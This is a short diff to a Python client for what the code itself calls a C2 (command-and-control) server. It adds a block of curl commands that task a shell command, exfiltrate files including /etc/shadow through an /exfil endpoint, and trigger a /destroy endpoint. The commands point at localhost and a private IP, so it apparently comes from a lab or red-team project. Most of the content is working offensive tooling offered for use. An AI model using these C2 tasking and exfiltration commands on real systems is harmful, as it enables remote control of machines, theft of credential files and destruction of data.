@@ -1,11 +1,34 @@
 import requests
 import json
 import time
-# curl -k -X POST https://127.0.0.1:8443/task \
-#     -H "Content-Type: application/json" \
-#     -d '{"cmd": "ls"}'
 
-base_url = "https://192.168.0.223:8443/" # Replace with your C2 URL
+shell_cmds = """
+URL='127.0.0.1:8443'
+# tasking
+curl -k -X POST https://${URL}/task \
+    -H "Content-Type: application/json" \
+    -d '{"cmd": "ls"}'
+
+# valid file exfil
+curl -k -X POST https://${URL}/exfil \
+    -H "Content-Type: application/json" \
+    -d '{"files": "testfile.txt"}'
+
+# file not found
+curl -k -X POST https://${URL}/exfil \
+    -H "Content-Type: application/json" \
+    -d '{"files": "notafile.txt"}'
+
+# missing read perms
+curl -k -X POST https://${URL}/exfil \
+    -H "Content-Type: application/json" \
+    -d '{"files": "/etc/shadow"}'
+
+# destroy
+curl -k -X POST https://${URL}/destroy
+"""
+
+base_url = "https://192.168.0.223:8443/"  # Replace with your C2 URL
 
 url = base_url + "task"
 headers = {"Content-Type": "application/json"}
